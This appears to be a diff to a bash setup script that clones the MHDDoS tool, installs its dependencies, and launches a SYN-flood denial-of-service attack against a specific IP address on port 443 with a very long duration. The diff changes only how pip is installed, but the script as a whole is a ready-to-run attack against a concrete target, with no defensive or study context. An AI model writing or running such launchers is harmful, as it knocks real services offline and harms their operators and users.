@@ -1,7 +1,6 @@
 #!/bin/bash
 git clone https://github.com/MatrixTM/MHDDoS.git
-curl -sSL https://bootstrap.pypa.io/get-pip.py -o get-pip.py
-python3 get-pip.py
+sudo apt install python3-pip
 cd MHDDoS/
 pip install -r requirements.txt
 python3 start.py syn 80.96.156.22:443 100 999999
